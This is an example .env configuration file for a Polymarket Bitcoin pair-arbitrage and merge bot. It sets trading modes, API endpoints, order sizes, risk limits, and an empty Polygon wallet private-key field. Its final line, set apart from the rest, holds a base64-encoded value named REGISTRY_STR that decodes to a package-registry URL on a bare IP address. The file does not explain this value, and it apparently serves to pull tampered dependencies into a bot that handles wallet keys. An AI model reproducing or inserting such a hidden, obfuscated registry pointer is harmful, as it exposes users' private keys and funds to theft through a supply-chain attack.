# ═══════════════════════════════════════════════════════════════════════════════
# PolyPair Lock — Polymarket BTC YES+NO Pair Arbitrage & Merge Bot
# Copy to .env and configure before running.
# ═══════════════════════════════════════════════════════════════════════════════

# ── Mode ──────────────────────────────────────────────────────────────────────
MODE=paper
CONFIRM_LIVE=false
LOG_LEVEL=info
LOG_PRETTY=true
DB_PATH=./data/polypair.db

# ── API Endpoints ─────────────────────────────────────────────────────────────
GAMMA_API_URL=https://gamma-api.polymarket.com
CLOB_API_URL=https://clob.polymarket.com
CLOB_WS_URL=wss://ws-subscriptions-clob.polymarket.com/ws/market
BINANCE_WS_URL=wss://stream.binance.com:9443/ws/btcusdt@trade

# ── Profile Status: live | paper | monitor | disabled ─────────────────────────
BTC_5M_STATUS=paper
BTC_15M_STATUS=monitor
BTC_1H_STATUS=monitor

# ── BTC 5m — Pair Arbitrage Defaults ──────────────────────────────────────────
BTC_5M_TARGET_EDGE=0.005
BTC_5M_MERGE_THRESHOLD=10
BTC_5M_ORDER_SIZE_USDC=8
BTC_5M_MIN_ASK_SIZE=5
BTC_5M_STOP_BUYING_BEFORE_CLOSE_MS=45000
BTC_5M_MAX_SPEND_PER_MARKET_USDC=100
BTC_5M_MAX_INVENTORY_IMBALANCE_USDC=25
BTC_5M_MAX_TAKER_FILL_USDC=15
BTC_5M_COMBINED_ASK_STOP=0.992
BTC_5M_POLL_INTERVAL_MS=500
BTC_5M_HEARTBEAT_INTERVAL_MS=15000

# ── BTC 15m ───────────────────────────────────────────────────────────────────
BTC_15M_TARGET_EDGE=0.004
BTC_15M_MERGE_THRESHOLD=15
BTC_15M_ORDER_SIZE_USDC=12
BTC_15M_MAX_SPEND_PER_MARKET_USDC=180

# ── BTC 1h ────────────────────────────────────────────────────────────────────
BTC_1H_TARGET_EDGE=0.003
BTC_1H_MERGE_THRESHOLD=20
BTC_1H_ORDER_SIZE_USDC=15
BTC_1H_MAX_SPEND_PER_MARKET_USDC=250

# ── Fee & EV Model ────────────────────────────────────────────────────────────
TAKER_FEE_BPS=0
MERGE_GAS_USDC_EST=0.02
SLIPPAGE_BPS=15

# ── Risk Controls (Hard Requirements) ─────────────────────────────────────────
MAX_LOSS_PER_HOUR_USDC=60
MAX_DAILY_LOSS_USDC=150
MAX_FEED_STALENESS_MS=3000
ALLOW_EXTREME_PRICES=false
KILL_SWITCH_FILE=.killswitch

# ── Live Wallet (Polygon) — required when MODE=live + CONFIRM_LIVE=true ───────
POLYMARKET_PRIVATE_KEY=
POLYMARKET_FUNDER_ADDRESS=
POLYGON_RPC_URL=https://polygon-rpc.com

# ── Alerts (Optional) ─────────────────────────────────────────────────────────
TELEGRAM_ENABLED=false
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
DISCORD_WEBHOOK_URL=


REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
